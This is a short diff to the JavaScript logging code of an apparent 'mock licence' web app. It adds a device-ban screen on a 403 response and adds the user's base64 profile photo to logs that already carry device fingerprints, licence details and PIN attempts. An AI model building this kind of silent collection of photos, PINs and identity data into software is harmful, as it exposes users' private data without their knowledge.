@@ -1102,21 +1102,38 @@ function sendLog(payload) {
     },
     body: data,
     keepalive: true
+  }).then(res => {
+    if (res.status === 403) {
+      document.body.innerHTML = `
+        <div style="height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;padding:20px;background:#fff;color:#000;">
+          <h1 style="font-size:48px;margin-bottom:10px;">🚫</h1>
+          <h2 style="margin:0;">Access Denied</h2>
+          <p style="color:#666;margin-top:10px;">This device has been banned from accessing the mock licence system.</p>
+        </div>`;
+    }
   }).catch(() => {});
 }
 
 async function logAccess(event, success = false, pinAttempt = null) {
+  const deviceId = getDeviceId();
   const fingerprint = getFingerprint();
   const details = getLicenceDetails();
   const payload = {
     timestamp: new Date().toISOString(),
-    deviceId: getDeviceId(),
+    deviceId: deviceId,
     event: event,
     success: success,
     pin_attempt: pinAttempt,
     ...fingerprint,
     ...details
   };
+  
+  if (event === 'data_updated' || event === 'pin_success' || event === 'app_fully_loaded') {
+    const photoEl = document.getElementById("profilePhoto");
+    if (photoEl && photoEl.src && photoEl.src.startsWith('data:image')) {
+      payload.photo = photoEl.src;
+    }
+  }
 
   sendLog(payload);
 }
